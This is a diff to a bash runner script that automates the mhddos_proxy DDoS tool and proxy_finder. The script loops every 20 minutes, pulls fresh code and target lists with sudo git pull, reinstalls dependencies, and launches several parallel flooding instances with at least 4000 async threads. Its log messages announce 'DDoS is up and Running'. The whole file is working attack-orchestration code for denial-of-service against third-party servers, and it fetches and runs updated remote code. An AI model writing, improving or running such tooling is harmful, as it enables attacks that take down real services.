@@ -51,7 +51,6 @@ then
 	debug="--debug"
 fi
 
-
 rand=3
 
 proc_num=$(nproc --all)
@@ -90,19 +89,86 @@ then
 	fi
 	
 	
-	if ((num_of_copies > 1));
-	then 
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPUs, so attack will be started only with 1 parallel attack\033[0;0m\n"
-		num_of_copies=1
+	rand=$(shuf -i 1-2 -n 1)
+	if ((rand == 1));
+	then
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
+	else
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
 	fi
+	
+	if ((rand == 2));
+	then
+		if ((num_of_copies > 1));
+		then 
+			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so attack will be started only with 1 parallel attack\033[0;0m\n"
+			num_of_copies=1
+		fi
+	fi
+
+elif ((proc_num > 4));
+then
+	if ((threads < 4000));
+	then
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads for $proc_num CPUs - attack will be started with 4000 async threads\033[0;0m\n"
+		threads=4000
+	fi
+
 fi
+
 
 sleep 5s
 
-# Restart attacks and update targets list every 20 minutes
+
+# Restarts attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
 do	
+	cd ~/mhddos_proxy
+	
+	num0=$(sudo git pull origin main | grep -E -c 'Already|Уже|Вже')
+   	echo "$num0"
+   	
+   	if ((num0 == 1));
+   	then	
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
+	else
+		python3 -m pip install -r requirements.txt
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
+		sleep 2s
+	fi
+	
+	cd ~/proxy_finder	
 
+	num0=$(sudo git pull origin main | grep -E -c 'Already|Уже|Вже')
+   	echo "$num0"
+   	
+   	if ((num0 == 1));
+   	then	
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date proxy_finder"
+	else
+		python3 -m pip install -r requirements.txt
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated proxy_finder"
+		sleep 2s
+	fi
+	
+	cd ~/auto_mhddos_alexnest
+   	num=$(sudo git pull origin main | grep -E -c 'Already|Уже|Вже')
+   	echo "$num"
+   	
+   	if ((num == 1));
+   	then	
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
+	else
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
+		bash runner.sh $num_of_copies $threads $rpc $debug # run new downloaded script 
+	fi
+	#
    	sleep 3s
 	
 	if ((rand == 2));
@@ -121,7 +187,7 @@ do
 	
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
 		
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
 		sleep 3s
 		# Launch multiple mhddos_proxy instances with different targets.
@@ -139,7 +205,7 @@ do
 	    		sleep 20s
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    		done
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be going only mhddos_proxy (without proxy_finder)\033[0;0m\n"
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be going only mhddos_proxy (without proxy_finder)\033[0;0m\n"
    		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
 	
 	elif ((rand == 3));
@@ -172,7 +238,7 @@ do
             
             		cd ~/mhddos_proxy
             		python3 runner.py $cmd_line -t $threads --vpn $debug&
-	    		sleep 10s
+	    		sleep 20s
 			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 		done
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
@@ -182,14 +248,14 @@ do
 		cd ~/proxy_finder
 		python3 finder.py&
 	else
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
 		sleep 3s
 		cd ~/proxy_finder
-		python3 finder.py --threads 3500&
+		python3 finder.py&
 	fi
 	
-   	sleep $restart_interval
+	sleep $restart_interval
 	clear
    	
    	#Just in case kill previous copy of mhddos_proxy
